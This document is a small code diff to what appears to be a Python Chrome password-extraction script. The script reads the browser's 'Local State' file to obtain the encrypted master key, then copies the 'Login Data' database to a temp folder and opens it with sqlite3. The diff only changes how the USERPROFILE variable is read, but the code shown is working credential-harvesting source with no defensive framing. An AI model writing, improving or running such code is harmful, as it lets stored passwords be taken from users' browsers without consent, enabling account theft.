@@ -8,7 +8,7 @@ import shutil
 
 
 def get_master_key():
-    with open(os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r") as f:
+    with open(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
@@ -31,7 +31,7 @@ def decrypt_password(buff, master_key):
 
 def main():
     master_key = get_master_key()
-    login_db = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
+    login_db = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
     login_db_copy = os.getenv("TEMP") + "\\login.db"
     shutil.copy2(login_db, login_db_copy)
     conn = sqlite3.connect(login_db_copy)
